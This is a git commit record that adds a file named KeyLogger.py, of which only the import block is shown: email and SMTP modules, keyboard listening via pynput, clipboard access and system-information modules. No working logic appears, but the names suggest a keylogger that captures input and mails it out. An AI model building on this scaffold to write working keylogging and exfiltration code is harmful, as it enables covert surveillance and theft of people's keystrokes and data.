d71e7139de899c4d9a5dbba7f250bd324fbd06ed
Md. Fahmidul Karim Rafi <137741434+PDOX103@users.noreply.github.com>
2025-03-28 17:16:37 +0600

    Update

---
+++ Project/KeyLogger.py
@@ -0,0 +1,18 @@
+#Libraries
+
+from email.mime.nonmultipart import MIMENonMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+import socket
+import platform
+
+import win32clipboard
+
+from pynput.keyboard import Key, Listener
+
+import time
+import os
+
